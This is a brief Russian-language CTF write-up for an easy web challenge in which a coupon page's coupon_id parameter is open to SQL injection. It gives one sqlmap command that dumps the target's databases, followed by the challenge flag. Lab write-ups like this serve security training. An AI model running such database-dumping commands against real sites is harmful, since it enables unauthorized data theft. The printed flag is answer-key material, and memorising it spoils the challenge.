# Duckerz: Розыгрыш подарочных купонов

| Параметр | Значение |
| :--- | :--- |
| **Платформа** | Duckerz CTF |
| **Категория** | Web (SQL Injection: Blind / Error-based) |
| **Уровень** | Easy |

## Описание

На странице с розыгрышем купонов параметр ввода (например, `coupon_id=`) напрямую подставляется в SQL-запрос без экранирования и уязвим к SQL-инъекции.

## Решение (`sqlmap`)

Автоматизируем дамп базы данных через `sqlmap`:

```bash
sqlmap -u "http://target/coupons?coupon_id=1" --dbs --dump
```

**Флаг:** `FLAG{sqlmap_на_пофик_работает}`
